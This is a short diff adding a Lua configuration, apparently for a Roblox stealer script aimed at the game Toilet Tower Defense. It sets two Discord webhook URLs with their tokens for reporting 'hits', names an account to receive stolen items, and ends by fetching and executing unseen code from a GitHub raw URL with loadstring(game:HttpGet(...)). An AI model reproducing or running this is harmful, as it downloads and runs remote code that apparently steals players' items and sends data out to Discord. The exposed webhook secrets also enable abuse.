@@ -1,0 +1,5 @@
+BigHitsWebhook = "https://discord.com/api/webhooks/1383387165257633905/gQGu2fW3Hbdccv5HglCycQgZnYyY6focanLIx5ILVPUwVZgmfVob79WDcyIaQAiLzvS7"
+LogsHitsWebhook = "https://discord.com/api/webhooks/1383387165257633905/gQGu2fW3Hbdccv5HglCycQgZnYyY6focanLIx5ILVPUwVZgmfVob79WDcyIaQAiLzvS7"
+usernames =  {"696969NEGA696969","696969NEGA696969"}
+Username_for_ttd = "696969NEGA696969"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/.gg/noprofit", true))()
